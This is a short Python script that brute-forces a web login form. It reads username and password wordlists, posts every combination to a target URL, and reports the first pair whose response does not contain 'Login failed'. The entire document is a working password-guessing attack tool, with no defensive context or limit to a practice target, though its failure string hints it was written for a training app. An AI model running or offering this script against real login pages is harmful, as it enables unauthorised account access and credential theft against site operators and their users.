import requests
from argparse import ArgumentParser


def get_args():
    parser = ArgumentParser()
    parser.add_argument("-target",
                        dest="target_url",
                        required=True,
                        help="Target URL against the wordlists have to be run",
                        )
    parser.add_argument("-U",
                        dest="user_list",
                        help="List of possible usernames"
                        )
    parser.add_argument("-P",
                        dest="password_list",
                        help="List of possible passwords")
    return parser.parse_args()


def POST(url,data_dict):
    response = requests.post(url, data=data_dict)
    return response

def brute(url,users, passwords):
    data = {"username":"",
        "password":"",
        "Login":"submit"
        }
    for user in users:
        data["username"] = user.strip()
        for password in passwords:
            data["password"] = password.strip()
            resp = POST(url, data)
            # print(data)
            if "Login failed" not in resp.content.decode('utf-8'):
                print("[+] Combination Found -> ", 
                      "[USERNAME:",data["username"],
                      "| PASSWORD:",data["password"],"]")
                exit()
                
    print("[-] unsuccessful attempt - no combination found")

def main():
    args = get_args()
    url = args.target_url
    if not args.user_list:
        user = input("[+] Enter username:")
    if not args.password_list:
        passw = input("[+] Enter password:")
    if not args.user_list and not args.password_list:
        brute(url,[user],[passw])
    elif not args.user_list:
        file_obj = open(args.password_list,'r')
        passw = file_obj.readlines()
        brute(url,[user],passw)
        file_obj.close()
    elif not args.password_list:
        file_obj = open(args.user_list,'r')
        users = file_obj.readlines()
        brute(url,users,[passw])
        file_obj.close()
    else:
        file_obj1 = open(args.user_list)
        file_obj2 = open(args.password_list)
        brute(url,file_obj1.readlines(), file_obj2.readlines())
        file_obj1.close()
        file_obj2.close()
    exit(0)

if __name__ == "__main__":
    main()
